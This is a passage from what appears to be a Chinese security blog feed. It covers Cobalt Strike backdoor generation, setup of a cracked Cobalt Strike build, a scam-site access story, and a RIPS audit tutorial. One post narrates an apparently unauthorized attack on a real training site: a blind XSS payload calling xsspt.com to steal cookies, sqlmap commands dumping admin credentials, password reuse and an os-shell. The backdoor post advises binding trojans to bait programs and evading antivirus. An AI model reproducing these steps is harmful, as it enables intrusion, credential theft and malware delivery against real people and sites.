title="0x002-Cobaltstrike生成后门"></a>0x002-Cobaltstrike生成后门</h2><h3 id="①Payload概念"><a href="#①Payload概念" class="headerlink" title="①Payload概念"></a>①Payload概念</h3><p>Payload在渗透测试之中大家可以简单地理解为一段漏洞利用&#x2F;植入后门的代码或程序。</p><h3 id="②Cobaltstrike生成后门"><a href="#②Cobaltstrike生成后门" class="headerlink" title="②Cobaltstrike生成后门"></a>②Cobaltstrike生成后门</h3><p>攻击–&gt;生成后门<br><a href="https://imgchr.com/i/euTGQI"><img src="https://s2.ax1x.com/2019/07/27/euTGQI.png" alt="euTGQI.png"></a><br>今天我们来讲红框中的四个生成后门的方式，其余的比较特殊，留作日后单独讲解。</p><h3 id="1-Payload-Generator"><a href="#1-Payload-Generator" class="headerlink" title="1.Payload Generator"></a>1.Payload Generator</h3><p>该模块可以生成n中语言的后门Payload，包括C,C#,Python,Java,Perl,Powershell脚本，Powershell命令，Ruby,Raw，免杀框架Veli中的shellcode等等…个人感觉这是CS的一个很大的迷人之处。<br><a href="https://imgchr.com/i/euTVQ1"><img src="https://s2.ax1x.com/2019/07/27/euTVQ1.png" alt="euTVQ1.png"></a><br>在渗透Windows主机过程中，我用的比较多的就是Powershell和Powershell Command，主要是因为其方便易用，且可以逃避一下杀毒软件（AV）的查杀。<br>以Powershell Command为例，生成的payload为一串命令，只要在主机上执行这一串命令（主机需安装Powershell），cs即可收到主机的beacon<br><a href="https://imgchr.com/i/euTudO"><img src="https://s2.ax1x.com/2019/07/27/euTudO.png" alt="euTudO.png"></a><br>其他语言的Payload，大家请自己研究~</p><h3 id="2-Windows-Dropper"><a href="#2-Windows-Dropper" class="headerlink" title="2.Windows Dropper"></a>2.Windows Dropper</h3><p>这个是一个windows程序的捆绑器，他可以实现把后门捆绑于其他程序之上，比如扫雷游戏，某些带有诱惑性的可执行文件…<br>个人感觉这种攻击方式结合社工来一同应用往往会发挥奇效~<br><a href="https://imgchr.com/i/euTneK"><img src="https://s2.ax1x.com/2019/07/27/euTneK.png" alt="euTneK.png"></a><br>在本处，我捆绑的文件为nidongde.txt，生成的后门名为dropper.exe<br>点击dropper.exe执行后，释放出了nidongde.txt文件，同时CS也收到了会话。<br><img src="https://s2.ax1x.com/2019/07/27/euTBWj.png" alt="euTBWj.png"></p><h3 id="3-Windows-Excutable-x2F-Windows-Excutable-s"><a href="#3-Windows-Excutable-x2F-Windows-Excutable-s" class="headerlink" title="3.Windows Excutable&#x2F;Windows Excutable(s)"></a>3.Windows Excutable&#x2F;Windows Excutable(s)</h3><h4 id="①Windows-Excutable生成的后门是Windows可执行文件，如exe，DLL"><a href="#①Windows-Excutable生成的后门是Windows可执行文件，如exe，DLL" class="headerlink" title="①Windows Excutable生成的后门是Windows可执行文件，如exe，DLL"></a>①Windows Excutable生成的后门是Windows可执行文件，如exe，DLL</h4><p><a href="https://imgchr.com/i/euTKoD"><img src="https://s2.ax1x.com/2019/07/27/euTKoD.png" alt="euTKoD.png"></a><br>exe文件运行后，CS即可收到目标主机的会话。<br>至于DLL大家可以使用针对DLL的相关攻击手法，这个我日后会写文章专门来讲</p><h4 id="②Windows-Excutable带有生成出的是stageless版本（无状态Windows后门木马），下面简单说下这个无状态木马的使用方法。一般使用无状态木马的网络环境是这样的"><a href="#②Windows-Excutable带有生成出的是stageless版本（无状态Windows后门木马），下面简单说下这个无状态木马的使用方法。一般使用无状态木马的网络环境是这样的" class="headerlink" title="②Windows Excutable带有生成出的是stageless版本（无状态Windows后门木马），下面简单说下这个无状态木马的使用方法。一般使用无状态木马的网络环境是这样的"></a>②Windows Excutable带有生成出的是stageless版本（无状态Windows后门木马），下面简单说下这个无状态木马的使用方法。一般使用无状态木马的网络环境是这样的</h4><p><a href="https://imgchr.com/i/euTQFe"><img src="https://s2.ax1x.com/2019/07/27/euTQFe.png" alt="euTQFe.png"></a></p><p>首先你需要让一台主机作为中转器，配合无状态木马使用</p><p><a href="https://imgchr.com/i/euTlJH"><img src="https://s2.ax1x.com/2019/07/27/euTlJH.png" alt="euTlJH.png"></a></p><p>这里选择中转器的监听器生成木马。需要注意–如果开启了防火墙会产生一个Windows安全警报。因此最好提前用cmd添加一个防火墙放行规则或关闭防火墙，随后便可将无状态的木马上传到内网的其他机器运行后返回一个会话</p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobaltstrike系列教程(一)简介与安装</title>
      <link href="/2019/06/07/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E4%B8%80-%E7%AE%80%E4%BB%8B%E4%B8%8E%E5%AE%89%E8%A3%85/"/>
      <url>/2019/06/07/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E4%B8%80-%E7%AE%80%E4%BB%8B%E4%B8%8E%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-Cobaltstrike简介"><a href="#0x01-Cobaltstrike简介" class="headerlink" title="0x01-Cobaltstrike简介"></a>0x01-Cobaltstrike简介</h2><p>Cobalt Strike是一款美国Red Team开发的渗透测试神器，常被业界人称为CS。这款神器许多大佬们都已经玩的很6，我一个菜鸡玩的略有心得，因此写一下自己的Cobaltstrike系列文章，希望给各位一点帮助。<br>最近这个工具大火，成为了渗透测试中不可缺少的利器。其拥有多种协议主机上线方式，集成了提权，凭据导出，端口转发，socket代理，office攻击，文件捆绑，钓鱼等功能。同时，Cobalt Strike还可以调用Mimikatz等其他知名工具，因此广受黑客喜爱。<br>项目官网:<a href="https://www.cobaltstrike.com/">https://www.cobaltstrike.com</a><br><a href="https://imgchr.com/i/eV6shQ"><img src="https://s2.ax1x.com/2019/07/24/eV6shQ.png" alt="eV6shQ.png"></a><br>话说这个工具的社区版是大家熟知的Armitage(一个MSF的图形化界面工具)，而Cobaltstrike大家可以理解其为Armitage的商业版。<br><img src="https://s2.ax1x.com/2019/07/24/eVcS4e.png" alt="eVcS4e.png"><br>早期版本CobaltSrtike依赖Metasploit框架，而现在Cobalt Strike已经不再使用MSF而是作为单独的平台使用，它分为客户端(Client)与服务端(Teamserver)，服务端是一个，客户端可以有多个，团队可进行分布式协团操作。<br><a href="https://imgchr.com/i/eVcPgA"><img src="https://s2.ax1x.com/2019/07/24/eVcPgA.png" alt="eVcPgA.png"></a></p><h2 id="0x02-Cobaltstrike架构"><a href="#0x02-Cobaltstrike架构" class="headerlink" title="0x02-Cobaltstrike架构"></a>0x02-Cobaltstrike架构</h2><p>本人使用的是Cabaltstrike3.13版本，虽然官方已经更新到3.14版本，但是我发现3.14版本并不稳定，因此不推荐使用<br>3.13版本文件架构如下。</p><p>│  Scripts 用户安装的插件<br>│  Log 每天的日志<br>│  c2lint  检查profile的错误异常<br>│  cobaltstrike<br>│  cobaltstrike.jar 客户端程序<br>│  icon.jpg      LOGO<br>│  license.pdf  许可证文件<br>│  readme.txt<br>│  releasenotes.txt<br>│  teamserver  服务端程序<br>│  update<br>│  update.jar   更新程序<br>└─third-party 第三方工具，里面放的vnc dll</p><p>当然，强大的CS也支持用户来扩展其功能<br>※私人定制</p><p>①Cobalt Strike可以使用 AggressorScripts脚本来加强自身，使其更加丰满，能够扩展菜单栏，视图Beacon命令行，提权脚本等</p><p>②Cobalt Strike通信配置文件是 Malleable C2 你可以修改 CS的通讯特征，Beacon payload的一些行为</p><p>③Cobalt Strike可以引用其他的通讯框架ExternalC2，ExternalC2是由Cobalt Strike提出的一套规范&#x2F;框架，它允许黑客根据需要对框架提供的默认HTTP(S)&#x2F;DNS&#x2F;SMB C2 通信通道进行扩展。</p><p>总的来说 CS的自定义功能很强大，使用起来很灵活后期，会讲到相关的使用。</p><h2 id="0x03-Cobaltstrike-teamserver的启动"><a href="#0x03-Cobaltstrike-teamserver的启动" class="headerlink" title="0x03-Cobaltstrike teamserver的启动"></a>0x03-Cobaltstrike teamserver的启动</h2><p>本人使用的Cobaltstrike是3.13汉化破解版本，各位如果有能力，可以支持一下正版哈,价格我是接受不太了的~此外，各位师傅也要买好VPS<br><img src="https://s2.ax1x.com/2019/07/24/eVcwvR.png" alt="eVcwvR.png"><br>开启Cobaltstrike teamserver和运行GUI界面均需要Java环境，因此老哥们必须先把电脑上的Java装好，这个百度上都写的很详细，我在此就不赘述了。</p><h3 id="1-Windows下启动teamserver"><a href="#1-Windows下启动teamserver" class="headerlink" title="1.Windows下启动teamserver"></a>1.Windows下启动teamserver</h3><p>①下载keytool.exe并将其复制到Cobaltstrike文件夹下<br>下载链接:<a href="http://www.onlinedown.net/soft/614989.htm">http://www.onlinedown.net/soft/614989.htm</a></p><p>②切换到Cobaltstrike目录执行如下命令</p><pre><code>Keytool.exe -keystore ./cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias cobaltstrike -dname &quot;CN=Major Cobalt Strike, OU=AdvancedPenTesting, O=cobaltstrike, L=Somewhere, S=Cyberspace, C=Earth&quot;</code></pre><p><a href="https://imgchr.com/i/eV6DAS"><img src="https://s2.ax1x.com/2019/07/24/eV6DAS.png" alt="eV6DAS.png"></a></p><p>③执行命令</p><p>  teamserver.bat 8.8.8.8 123456 </p><p>8.8.8.8为你的服务器外网IP,123456为Coabltstrike的客户端密码</p><p>④双击cobaltstrike.bat，填写服务器外网IP和teamserver密码，即可登入</p><h3 id="2-Linux下启动teamserver和客户端"><a href="#2-Linux下启动teamserver和客户端" class="headerlink" title="2.Linux下启动teamserver和客户端"></a>2.Linux下启动teamserver和客户端</h3><p>①cd切换到Cobaltstrike目录下<br>②执行命令<br>teamserver.bat 8.8.8.8 123456<br>8.8.8.8为你的服务器外网IP,123456为Coabltstrike的客户端密码<br><a href="https://s2.ax1x.com/2019/07/24/eV6c1s.png">https://s2.ax1x.com/2019/07/24/eV6c1s.png</a><br>③执行如下命令即可看到GUI界面</p><pre><code>Javaw -Dfile.encoding=UTF-8 -javaagent:CobaltStrikeCN.jar -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar</code></pre><h2 id="0x04-Cobaltstrike汉化破解版下载"><a href="#0x04-Cobaltstrike汉化破解版下载" class="headerlink" title="0x04-Cobaltstrike汉化破解版下载"></a>0x04-Cobaltstrike汉化破解版下载</h2><p>网上有很多，本BLOG暂不提供个人版本</p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次以小勃大，紧张刺激的渗透测试</title>
      <link href="/2019/03/17/%E8%AE%B0%E4%B8%80%E6%AC%A120%E6%92%B8240%E7%9A%84%E6%B2%99%E9%9B%95%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5%E6%8F%90%E4%BA%A4/"/>
      <url>/2019/03/17/%E8%AE%B0%E4%B8%80%E6%AC%A120%E6%92%B8240%E7%9A%84%E6%B2%99%E9%9B%95%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5%E6%8F%90%E4%BA%A4/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-起因"><a href="#0x01-起因" class="headerlink" title="0x01 起因"></a>0x01 起因</h2><p>这是一篇没有任何技术性的文章，单纯记录一下意想不到的赚小钱经历</p><p>前几个月，我的弟弟突然QQ给我发来了一条消息，说要买个QQ飞车的cdk，我作为一个通情达理的好哥哥，自然不好意思回绝，直接叫他发来了淘宝链接<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191442441.png" alt="image-20230419144208406" style="zoom:33%;" /><br>23块钱必中A车，月销量1000多。。看起来还行，本来也没多少钱，没仔细想，直接买了下来<br>商家发货的时候私聊给了我这个。。。<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191442539.png" alt="image-20230419144235519" style="zoom:33%;" /><br>他们给出的兑换CDK链接为</p><p><a href="http://39.104.158.110/game.html">http://39.104.158.110/game.html</a></p><p>你这是qq飞车的官网？？？如此粗制滥造的cdk兑换界面<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191442589.png" alt="image-20230419144255565"></p><p>很明显是在骗人，一怒之下找商家退款</p><p>并且跟骗子客服进行了长时间交流，谁知竟然驳回了我的退款要求</p><p>信息安全从业者的尊严一下觉醒了。</p><h2 id="0x02-进入发卡后台"><a href="#0x02-进入发卡后台" class="headerlink" title="0x02 进入发卡后台"></a>0x02 进入发卡后台</h2><p>访问<a href="http://39.104.158.110这个主界面/">http://39.104.158.110这个主界面</a><br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191444080.png" alt="image-20230419144401051"><br>看下前台JS代码<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191444875.png" alt="image-20230419144410855"><br>据此推测，极有可能存在未授权访问。</p><p>直接访问网址:<a href="http://39.104.158.110/user/onindex%EF%BC%8C">http://39.104.158.110/user/onindex，</a><br>成功进入后台<br>让我们看看后台是什么样子的<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191444291.png" alt="image-20230419144425269"></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191444658.png" alt="image-20230419144443629">真的很厉害哦，还可以生成官方的cdk？？？<br>还可以配置输入cdk后的返回模板？？？？</p><p>诈骗性质不言而喻，而淘宝评价中全是好评，我也着实费解了</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191445240.png" alt="image-20230419144504218"></p><h2 id="0x03-事后"><a href="#0x03-事后" class="headerlink" title="0x03 事后"></a>0x03 事后</h2><p>随后我把他们后台的截图发给了骗子客服，客服也没回复我，咱也不知道是怂了还是怎么了</p><p>一怒之下，决定提交给ASRC</p><p>当时并没想到这种沙雕威胁情报能拿到奖金，只是想惩戒一下这种**骗子而已。</p><p>没想到ASRC确认了情报，下架了该店铺<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191446634.png" alt="image-20230419144601604"><br>我靠，还有24个安全币<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191446127.png" alt="image-20230419144613099"><br>至此，20撸240圆满成功。</p><p>总有些意想不到的际遇，实在没想到这也能给钱</p>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次以小勃大，紧张刺激的渗透测试</title>
      <link href="/2018/07/07/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%A5%E5%B0%8F%E5%8B%83%E5%A4%A7%EF%BC%8C%E7%B4%A7%E5%BC%A0%E5%88%BA%E6%BF%80%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
      <url>/2018/07/07/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%A5%E5%B0%8F%E5%8B%83%E5%A4%A7%EF%BC%8C%E7%B4%A7%E5%BC%A0%E5%88%BA%E6%BF%80%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h2 id="一、起因"><a href="#一、起因" class="headerlink" title="一、起因"></a>一、起因</h2><p>emmm，炎炎夏日到来，这么个桑拿天干什么好呢？</p><p>没错，一定要坐在家里，吹着空调，吃着西瓜，然后静静地挖洞。挖洞完叫个外卖，喝着啤酒，撸着烧烤，岂不美哉？然此可为智者道，难为俗人言也。。。正在我沉迷在对夏日的意淫之时，我亲爱的妈妈忽然给我来了一波夺命连环call。<br><img src="https://s2.loli.net/2023/04/19/AkbOQ8mXJrWGciF.png" alt="image"></p><pre><code>大概内容如下：   --妈妈：儿呀。。。你印布隐私（认不认识）搞公务员培训的机构，帮我在网上瞅瞅去，我有个朋友他儿想考公务员~   --我：（声音笑嘻嘻，心里mmp）哎呀，这个bia的天，搁家里睡觉行了。。别弄了。。   --妈妈：MLGB，叫你整，你就快点的，晚上给我回电话。     哎，父母之命不可违，悲伤的我只能放下手里的键盘和瓜皮，开始去百度上找培训机构。</code></pre><p><img src="https://s2.loli.net/2023/04/19/8SXb7ntzhoQa1VW.png" alt="image"></p><p>百度上面找了好久，都没找到太合适的。问了问身边的朋友：朋友给了一家网校的报名地址<br><a href="http://xxxxx.com/3g/***/2203947.htm">http://xxxxx.com/3g/***/2203947.htm</a><br><img src="https://s2.loli.net/2023/04/19/XGxvwty2PqhbYFm.png" alt="image"></p><p>没错，还带免费试学。。。真的先进。。。。<br>于是打开爱站查了一波权重。。。<br><img src="https://s2.loli.net/2023/04/19/7h8WRjPqx2pzUti.png" alt="image"></p><p>这尼玛？？？百度权7，emmm，有点意思。见到这么高权重的站，那时我已饥渴难耐，便决定对此站点来一波渗透测试。</p><h2 id="二、XSS盲打？安排一下"><a href="#二、XSS盲打？安排一下" class="headerlink" title="二、XSS盲打？安排一下"></a>二、XSS盲打？安排一下</h2><p><img src="https://s2.loli.net/2023/04/19/TBtgFWdhwo1rHva.png" alt="image"></p><p>看到这里，小伙伴们肯定想。。。emm，是不是可以XSS打一下试试呢？<br>说干咱就干。。。见框就插,接下来就插入xss payload试试吧。。。<br>Payload: <code>&lt;/textarea&gt;&lt;script src=&quot;=&quot;http://xsspt.com/z6ocdy?1531815744&quot;&gt;&lt;/script&gt;</code><br>将payload完整黏贴进去，如图发现仅有&lt;&#x2F;tex    这四个字符<br><img src="https://s2.loli.net/2023/04/19/qlosKBVe4MQ7wnT.png" alt="image"></p><p>审查元素看下，在表单处理上设置了maxlength，直接审查元素大法改掉就好了<br>max length改为999<br><img src="https://s2.loli.net/2023/04/19/INOkbRoaCGU2trM.png" alt="image"><br> 然后我们的XSS Payload就可以正常地全部输入到表单中了<br><img src="https://s2.loli.net/2023/04/19/rEiRl8Oez6Y4Nbf.png" alt="image"></p><p>手机那个文本框，我随便填了11位数字，然后点击提交，万幸的的是提交成功了（后端没对内容进行验证）<br>过了大概1个小时，突然XSS平台的邮件来了，兴奋ing。。。（客服是真的敬业）<br><img src="https://s2.loli.net/2023/04/19/jFwefGsIN4zWPhA.png" alt="image"></p><p>拿着cookie，挂好代理傻啦吧唧地就是进入后台一波浏览，发现权限非常小，基本上只能处理处理客服工作<br><img src="https://s2.loli.net/2023/04/19/CDsozeBltMFfQnK.png" alt="image"></p><p>不过可以查看后台的管理员账号。。。。。（果然是个大站，后台分工权限这么讲究。。。）<br><img src="https://s2.loli.net/2023/04/19/ENcTCxLXKJve3qi.png" alt="image"></p><p>看着这么多的超级管理员账号，而我却只是个吊毛客服，基本上没什么权限，心里真的难受的一批。。<br>难道我们的渗透到这里就要结束？？不可能，这显然不符合本屌的风格。。。<br><img src="https://s2.loli.net/2023/04/19/7caIFXZzemCRuVf.png" alt="image"></p><p>于是我又仔细地翻了翻后台，看看有没有地方可以来一波骚操作。。。</p><h2 id="三、后台SQL注入？讲究"><a href="#三、后台SQL注入？讲究" class="headerlink" title="三、后台SQL注入？讲究"></a>三、后台SQL注入？讲究</h2><p>大家可以看到我们的客服处理界面是可以进行查询的，查询的过程是通过GET方式传导一个mobile参数实现查询</p><p>我们直接FUZZ了一下SQL注入的Payload，看看是否存在注入。</p><p>发现传递特殊字符后，页面没有返回信息，那么就很有可能存在SQL注入。<br><img src="https://s2.loli.net/2023/04/19/5yzX2oJbgBaNnGY.png" alt="image"></p><p>我们使用BurpSuite来抓取本出的的HTTP请求，然后保存在C:\Users\Samsung 700Z5C\Desktop\1.txt中<br><img src="https://s2.loli.net/2023/04/19/7UEgMCSLybF4YIH.png" alt="image"></p><p>接下来到了以小勃大，紧张刺激的时刻，使用SQLMAP的 -r参数，注入本HTTP请求<br><code>sqlmap -r C:\Users\Samsung 700Z5C\Desktop\1.txt</code><br><img src="https://s2.loli.net/2023/04/19/FQko9HntjrMm5T4.png" alt="image"></p><p>注入成功了。哈哈哈。。。。我们开始直奔管理员的表<br>命令为<code>sqlmap -r C:\Users\Samsung 700Z5C\Desktop\1.txt --tables -D &quot;nd_net&quot; </code>     &#x2F;&#x2F;列出nd_net数据库的表<br><img src="https://s2.loli.net/2023/04/19/aD5vJPpdItVkgU4.png" alt="image"></p><p>然后执行<br><code>sqlmap -r C:\Users\Samsung\Desktop\1.txt --columns -T &quot;net_admin_user&quot; -D &quot;nd_net&quot;   //列出net_admin_user</code>表的字段<br><img src="https://s2.loli.net/2023/04/19/syGtfThrBKvXSep.png" alt="image"></p><p>最后执行命令<br><code>sqlmap.py -r &quot;I:\T00l\1.txt&quot; --dump -C &quot;id,nd_user,userid,nd_pass&quot; -T &quot;net_admin_user&quot; -D &quot;nd_net&quot; --threads=10   //导出net_admin_user表中id,nd_user,userid,nd_pass几个字段的数据</code><br><img src="https://s2.loli.net/2023/04/19/oRmSxVl5zUELvXQ.png" alt="image"></p><p>全部是md5加密，拿到cmd5，一波解密，成功获取到所有管理员的账号密码，然后成功登陆以管理员的权限登陆后台<br><img src="https://s2.loli.net/2023/04/19/wuAtjc89YFPogmb.png" alt="image"></p><p>哈哈，讲究！</p><h2 id="四、不拿Shell，与咸鱼有什么区别？"><a href="#四、不拿Shell，与咸鱼有什么区别？" class="headerlink" title="四、不拿Shell，与咸鱼有什么区别？"></a>四、不拿Shell，与咸鱼有什么区别？</h2><p>emm，就算是管理员的权限。我发现可以利用的地方依然很少，只有一些静态页面的编辑权限（而且编辑器是KindEditor，没什么方法上传拿Shell）,我当时十分绝望。。。但是我发现了这个——数据库备份<br><img src="https://s2.loli.net/2023/04/19/NgsyjOKr9BChRux.png" alt="image"></p><p>点击后，跳转到一款叫做“帝国备份王”的程序<br><img src="https://s2.loli.net/2023/04/19/ceJI6Q2SZquURYj.png" alt="image"></p><p>随后，我便去该程序的官网，下载了一个帮助文档。使用默认用户admin&#x2F;123456进行登陆，但是以失败告终。<br>但我怎末可能放弃，我一个一个测试了之前后台SQL注入得到的密码，最终在一个密码上成功地登陆了。。。</p><p>我靠，高兴死我。。。。。。。。<br><img src="https://s2.loli.net/2023/04/19/GIDgkBHJC7LNl3t.png" alt="image"></p><p>发现了一个PHP探针<br><img src="https://s2.loli.net/2023/04/19/fLXW47QSDBhOxyZ.png" alt="image"></p><p>再掏出SQLMAP，直接使用命令 用之前的注入点获取shell</p><p>sqlmap -r C:\Users\Samsung 700Z5C\Desktop\1.txt –os-shell<br><img src="https://s2.loli.net/2023/04/19/ORNjiFl4C6t1MTh.png" alt="image"></p><p>输入我们通过探针得到的路径，很幸运，ROOT权限直接os-shell成功。直接上一句话，GetShell完美结束<br><img src="https://s2.loli.net/2023/04/19/NvHrg3s7CSXjh1n.png" alt="image"></p><h2 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h2><p>本次渗透测试，虽然没有骚操作，但是总体来说用到了许多知识，现进行总结<br>1.XSS盲打技术<br>2.SQLMAP注入HTTP响应包的语法<br>3.人性的弱点分析（多个程序用同一个管理密码）<br>4.从获取绝对路径到SQLMAP获取shell<br>5.审查元素小技巧</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞挖掘 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP代码审计神器——RIPS个人汉化版</title>
      <link href="/2018/04/10/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%A5%9E%E5%99%A8%E2%80%94%E2%80%94RIPS%E4%B8%AA%E4%BA%BA%E6%B1%89%E5%8C%96%E7%89%88-1/"/>
      <url>/2018/04/10/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%A5%9E%E5%99%A8%E2%80%94%E2%80%94RIPS%E4%B8%AA%E4%BA%BA%E6%B1%89%E5%8C%96%E7%89%88-1/</url>
      
        <content type="html"><![CDATA[<h2 id="一、RIPS简介"><a href="#一、RIPS简介" class="headerlink" title="一、RIPS简介"></a>一、RIPS简介</h2><p>RIPS是一款PHP开发的开源的PHP代码审计工具，由国外的安全研究者Johannes Dahse开发，目前开源的最新版本是0.55。</p><p>程序小巧玲珑，仅有不到500kb，其中的PHP语法分析非常精准，可以实现跨文件变量和函数追踪，误报率较低。并有拥有简单易懂的用户界面，因此被许多安全研究人员钟爱，因此RIPS可谓是PHP代码审计之利器。</p><p>RIPS项目的官网为<a href="http://rips-scanner.sourceforge.net/">http://rips-scanner.sourceforge.net/</a><br>和 <a href="https://www.ripstech.com/">https://www.ripstech.com/</a><br>大家如果有兴趣可以自行了解</p><p>目前RIPS的免费开源版本已停止了程序更新，但官方目前给出了下个版本的说明<br><img src="https://s2.loli.net/2023/04/19/5BEldw4iNJIxtfO.png" alt="image"><br>简而言之就是官方想对程序的扫描精度，功能上进行了更进一步地拓展和升级，但神秘的作者也并没有告知我们下个版本的推送日期，所以我这次带来的是个人汉化版的RIPS—0.55版本。</p><p>个人汉化后的如图所示<br><img src="https://s2.loli.net/2023/04/19/DfkxF5wWYjMIv97.png" alt="image"><br><img src="https://s2.loli.net/2023/04/19/5BEldw4iNJIxtfO.png" alt="image"><br>部分地方汉化不全，还请各位大佬们海涵<br>下载地址见文末</p><h2 id="二、RIPS安装环境"><a href="#二、RIPS安装环境" class="headerlink" title="二、RIPS安装环境"></a>二、RIPS安装环境</h2><p>RIPS是基于PHP进行编写的，那么成功地运行RIPS便一定需要PHP环境的支持，在此我比较推荐使用PHPStudy这款程序来进行本地PHP环境安全<br>PHPstudy下载链接:<a href="http://phpstudy.php.cn/">http://phpstudy.php.cn/</a><br>安装后界面如图所示:<br><img src="https://s2.loli.net/2023/04/19/E9Hm2B6nMwUdrst.png" alt="image"></p><p>下载RIPS后将其解压放入PHPstduy的根目录下即可使用（无需进行任何数据库配置）<br><img src="https://s2.loli.net/2023/04/19/FkCg9BeUAzVDcJu.png" alt="image"></p><p>如图为RIPS安装成功后的界面<br><img src="https://s2.loli.net/2023/04/19/1qeawEB4OxmRr2c.png" alt="image"></p><h2 id="三、RIPS使用方法"><a href="#三、RIPS使用方法" class="headerlink" title="三、RIPS使用方法"></a>三、RIPS使用方法</h2><p>在程序的顶部”源码的绝对路径”文本框中输入你想要扫描的项目的绝对路径(如F:&#x2F;&#x2F;person&#x2F;phpstduy&#x2F;WWW&#x2F;dedecms)<br>然后根据个人的需求来选择扫描漏洞的范围，是否扫描根目录等，最后点击扫描即可。<br><img src="https://s2.loli.net/2023/04/19/ZIVGoWAEaQj6zHx.png" alt="image"><br><img src="https://s2.loli.net/2023/04/19/5iNsH2lgMS7ZAhw.png" alt="image"></p><p>扫描后即可查看扫描报告<br><img src="https://s2.loli.net/2023/04/19/HqVcEukiFl9zpwY.png" alt="image"></p><h2 id="四、RIPS审计实例"><a href="#四、RIPS审计实例" class="headerlink" title="四、RIPS审计实例"></a>四、RIPS审计实例</h2><p>我们先以笔者多年前刚刚学PHP时写的垃圾程序开一下刀(拿老裤写的，你懂得)<br><img src="https://s2.loli.net/2023/04/19/tkVbpl9LaFjZQUm.png" alt="image"></p><p>扫描后结果如图<br><img src="https://s2.loli.net/2023/04/19/56mHoitakzhPpQ8.png" alt="image"></p><p>可以看到存在XSS、文件读取、PHP代码执行、HTTP header注入等漏洞，我们选择XSS和文件读取漏洞来测试一下RIPS审计的准确性。</p><h3 id="①XSS漏洞处代码如下"><a href="#①XSS漏洞处代码如下" class="headerlink" title="①XSS漏洞处代码如下"></a>①XSS漏洞处代码如下</h3><pre><code class="php">echo &quot;-&gt;&lt;a href=\&quot;&#123;$_SERVER[&#39;PHP_SELF&#39;]&#125;?path=&quot; . _encode ($f[&#39;..&#39;]) . &quot;\&quot;&gt;上级目录      &lt;/a&gt; &quot;; $f = _opendir (_decode ($_GET[&#39;path&#39;]));  // elseif($_GET == null) else ,$f = _opendir (&#39;xiaojie&#39;);  // elseif($_GET == null),$f = _opendir (&#39;xiaojie&#39;);  // if($_GET == &#39;..&#39;)，</code></pre><p>可以看到该程序对f这个变量未进行过滤，直接将其输出，因此很可能存在XSS漏洞结合RIPS的漏洞说明可以知道XSS漏洞的成因及POC<br><img src="https://s2.loli.net/2023/04/19/yHn4dgwK9T6Mjir.png" alt="image"></p><p>我们来测试一下<br><img src="https://s2.loli.net/2023/04/19/ol3mVd7GHhz2baj.png" alt="image"></p><p>如图，我们成功地弹窗了。证明RIPS对该程序的XSS审计是很准确的。</p><h3 id="②任意文件读取处代码如下"><a href="#②任意文件读取处代码如下" class="headerlink" title="②任意文件读取处代码如下"></a>②任意文件读取处代码如下</h3><pre><code>echo echo &quot;-&gt;&lt;a href=\&quot;&#123;$_SERVER[&#39;PHP_SELF&#39;]&#125;?path=&quot; . _encode ($f[&#39;..&#39;]) . &quot;\&quot;&gt;上级目录      &lt;/a&gt; &quot;; $f = _opendir (_decode ($_GET[&#39;path&#39;]));  // elseif($_GET == null) else ,$f = _opendir (&#39;xiaojie&#39;);  // elseif($_GET == null),$f = _opendir (&#39;xiaojie&#39;);  // if($_GET == &#39;..&#39;),</code></pre><p>同样的，该程序未对data变量进行任何验证，直接使用file_get_contents读取文件内容<br><img src="https://s2.loli.net/2023/04/19/PsUZuoaTv5iSVJt.png" alt="image"></p><p>我们来读取一个host文件测试一下<br><img src="https://s2.loli.net/2023/04/19/nb7GANlTcWEBmsy.png" alt="image"></p><p>如图，我们成功读取到了host文件的内容</p><h2 id="五、总结"><a href="#五、总结" class="headerlink" 